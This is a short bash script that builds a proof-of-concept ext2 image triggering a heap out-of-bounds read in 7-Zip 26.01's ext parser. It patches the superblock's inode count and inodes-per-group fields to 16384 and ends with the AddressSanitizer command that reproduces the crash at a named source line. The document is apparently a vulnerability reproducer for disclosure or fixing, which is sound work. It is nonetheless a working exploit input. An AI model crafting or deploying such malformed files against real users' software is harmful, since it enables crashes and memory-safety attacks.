#!/usr/bin/env bash
# Regenerate the PoC ext image (7-Zip 26.01 ext inode-bitmap OOB read).
# Deterministic: a valid ext2 filesystem + a 2-field superblock corruption.
# Requires: mke2fs (e2fsprogs) and python3.
#
# Usage: ./make_poc.sh [out.ext]
set -euo pipefail
OUT="${1:-poc.ext}"

# 1) Valid ext2: 1 KiB blocks, 128-byte inodes, 8192 blocks (= one block group),
#    no checksum features (ext2 default has neither metadata_csum nor gdt_csum),
#    so there is no group-descriptor / superblock CRC to invalidate on patch.
mke2fs -F -q -t ext2 -b 1024 -I 128 -N 2048 "$OUT" 8192

# 2) Corrupt the primary superblock (at file offset 1024 for a 1 KiB block fs):
#    push s_inodes_count (sb+0x00) and s_inodes_per_group (sb+0x28) to 16384.
#    16384 > blockSize*8 (=8192, the inode-bitmap bit capacity) and < 2^24, so
#    numNodes = min(InodesPerGroup, NumInodes) = 16384 and the inode-bitmap loop
#    over-reads the 1024-byte nodesMap at n=8192 (nodesMap[1024]). Keeping the two
#    fields equal keeps the block-group count at 1.
python3 - "$OUT" <<'PY'
import struct, sys
with open(sys.argv[1], "r+b") as f:
    f.seek(1024); f.write(struct.pack("<I", 16384))  # s_inodes_count      @ sb+0x00
    f.seek(1064); f.write(struct.pack("<I", 16384))  # s_inodes_per_group  @ sb+0x28
PY

echo "wrote $OUT ($(stat -c %s "$OUT") bytes)"
echo "run: ASAN_OPTIONS=detect_leaks=0 <7zz-26.01-asan> l $OUT   # -> heap-buffer-overflow @ ExtHandler.cpp:1267"
